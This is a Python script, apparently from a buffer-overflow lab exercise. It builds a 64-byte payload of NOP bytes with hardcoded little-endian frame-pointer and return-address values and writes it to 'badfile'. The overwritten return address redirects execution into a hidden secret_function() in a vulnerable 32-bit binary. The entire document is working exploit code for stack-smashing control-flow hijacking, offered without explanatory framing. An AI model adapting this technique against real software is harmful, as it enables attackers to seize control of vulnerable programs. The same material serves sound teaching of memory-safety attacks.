# populating 'content' of exploit with NOPs (no operation)
content = bytearray(0x90 for i in range(64))

# putting stack frame pointer value of main() in 'frame_pointer_main'
frame_pointer_main = 0xbfffed08  ## *((unsigned *)$ebp) in buffer_overflow()
content[24: 28] = frame_pointer_main.to_bytes(4, byteorder='little')

# putting return address value of buffer_overflow() to main() in 'return_address_main'
# this instruction is immediate next instruction of call to buffer_overflow() from main()
return_address_main = 0x080485f6  ## *((unsigned *)$ebp + 1) in buffer_overflow() or 'add esp, 0x10' in main() after 'call <buffer_overflow>'
content[28: 32] = return_address_main.to_bytes(4, byteorder='little')

# putting previous frame pointer value in 'previous_frame_pointer'
previous_frame_pointer = 0xbfffeb98 + 24  ## &buffer + 24 in buffer_overflow()
content[32: 36] = previous_frame_pointer.to_bytes(4, byteorder='little')

# putting first instruction address instead of entry-point address of secret_function() in 'return_address'
# return_address = 0x0804854a  ## 'push ebp' in secret_function()
return_address = 0x0804854d  ## 'sub esp, 0x8'  in secret_function()
content[36: 40] = return_address.to_bytes(4, byteorder='little')

# printing 'content' of exploit
for i in range(0, len(content), 4):
	print("{}--{}: {} {} {} {}".format(i, i+3, hex(content[i]), hex(content[i+1]), hex(content[i+2]), hex(content[i+3])))

# writing exploit to 'badfile'
with open('badfile', 'wb') as badfile:
    badfile.write(content)
